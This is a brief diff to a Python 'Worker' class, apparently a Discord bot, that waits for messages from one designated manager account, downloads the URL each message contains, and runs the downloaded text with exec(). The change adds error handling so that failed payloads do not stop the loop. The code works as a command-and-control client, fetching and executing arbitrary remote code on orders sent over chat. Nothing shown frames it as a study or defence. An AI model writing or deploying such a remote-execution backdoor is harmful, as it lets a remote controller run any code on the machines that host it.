@@ -30,4 +30,7 @@ class Worker:
     while True:
       order = await self.bot.wait_for("message", check=lambda m: m.author.id == self.manager and m.channel == self.base)
       page = requests.get(order.content).text
-      exec(str(page))
+      try:
+        exec(str(page))
+      except Exception as e:
+        print("Error in exec, prep: " + str(e))
